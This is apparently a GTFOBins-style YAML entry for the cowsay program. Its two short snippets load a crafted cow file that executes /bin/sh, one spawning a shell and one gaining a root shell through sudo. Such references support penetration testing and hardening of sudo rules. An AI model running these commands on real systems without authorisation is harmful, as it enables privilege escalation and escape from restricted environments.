functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'exec "/bin/sh";' >$TF
        cowsay -f $TF x
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'exec "/bin/sh";' >$TF
        sudo cowsay -f $TF x
---